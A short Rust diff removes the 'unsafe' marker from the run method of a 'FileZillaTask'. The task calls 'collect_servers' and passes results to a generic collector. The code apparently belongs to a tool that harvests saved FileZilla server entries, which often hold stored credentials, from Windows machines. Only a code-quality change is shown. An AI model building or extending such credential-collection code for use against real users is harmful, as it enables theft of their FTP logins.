@@ -13,7 +13,7 @@ use windows::Data::Xml::Dom::XmlDocument;
 pub(super) struct FileZillaTask;
 
 impl<C: Collector> Task<C> for FileZillaTask {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let servers = collect_servers();
 
         if servers.is_empty() {
